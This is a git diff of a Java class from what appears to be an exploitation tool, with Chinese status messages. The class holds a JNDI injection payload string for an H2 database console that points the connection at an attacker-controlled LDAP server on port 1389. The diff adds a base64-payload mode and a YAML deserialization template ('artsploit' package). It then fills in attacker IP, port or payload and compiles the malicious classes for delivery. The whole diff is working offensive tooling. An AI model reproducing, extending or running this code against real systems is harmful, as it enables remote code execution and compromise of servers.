@@ -13,10 +13,12 @@ import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.nio.file.StandardCopyOption;
 import java.util.Arrays;
+import java.util.Objects;
 
 public class ClsComp {
     private String vpsIP;
     private String vpsPort;
+    private String b64payload;
     public String text;
     public String exp = "language=en&setting=Generic+H2+%28Embedded%29&name=Generic+H2+%28Embedded%29&driver=javax.naming.InitialContext&url=ldap://%s:1389/src.main.template.JNDIObject.JNDIObject&user=&password=";
 
@@ -24,19 +26,30 @@ public class ClsComp {
         this.vpsIP = vpsIP;
         this.vpsPort = vpsPort;
     }
+    public ClsComp(String b64payload){
+        this.b64payload = b64payload;
+    }
 
     // 编译class
     public boolean modifyJavaClassFile(String filename, String outfilename, ResultCallback callback) {
         try {
             String filepath = System.getProperty("user.dir") + "/src/main/template/" + filename;
             String outpath = System.getProperty("user.dir") + "/resources/" + outfilename;
+            String allcontent = "";
             Path path = Paths.get(filepath);
             String content = new String(Files.readAllBytes(path));
             String filestr = Paths.get(filepath).getFileName().toString();
             String outfilestr = Paths.get(outfilename).getFileName().toString();
-            String allcontent = String.format(content,vpsIP,vpsPort).replaceAll(filestr.substring(0, filestr.lastIndexOf(".")),outfilestr.substring(0, outfilestr.lastIndexOf(".")));
+            if (b64payload != null && !b64payload.isEmpty()){
+                allcontent = String.format(content,b64payload).replaceAll(filestr.substring(0, filestr.lastIndexOf(".")),outfilestr.substring(0, outfilestr.lastIndexOf(".")));
+            }else{
+                allcontent = String.format(content,vpsIP,vpsPort).replaceAll(filestr.substring(0, filestr.lastIndexOf(".")),outfilestr.substring(0, outfilestr.lastIndexOf(".")));
+            }
             // 去掉原包中的模板文件package
-            allcontent = allcontent.replaceAll("package src.main.template.JNDIObject;","");
+            String regstr = "package src.main.template.JNDIObject;";
+            String regstr1 = "package src.main.template.YAMLObject;";
+            allcontent = allcontent.replaceAll(regstr,"");
+            allcontent = allcontent.replaceAll(regstr1,"package artsploit;");
             Files.write(Paths.get(outpath), allcontent.getBytes());
             text = outfilestr + "文件写入成功";
             callback.onResult(text);
@@ -49,9 +62,9 @@ public class ClsComp {
         return true;
     }
 
-    public void CompileJava(String filename,String outfile,ResultCallback callback){
-        String filepath = System.getProperty("user.dir") + "/resources/" + filename;
-        String outfilepath = System.getProperty("user.dir") + "/resources/" +  outfile;
+    public void CompileJava(String filename,String outfile,ResultCallback callback) throws IOException{
+        String filepath = System.getProperty("user.dir") + "/resources/" + filename + ".java";
+        String outfilepath = System.getProperty("user.dir") + "/resources/" +  outfile + ".class";
         File fileToCompile = new File(filepath);
 
         // 获取系统编译器
@@ -76,7 +89,7 @@ public class ClsComp {
         }
 
         if (success) {
-            text = outfile.replaceAll(".java",".class") + "文件编译成功";
+            text = outfile + "文件编译成功";
             callback.onResult(text);
             File compiledFile = new File(outfilepath);
             // 移动文件到指定路径
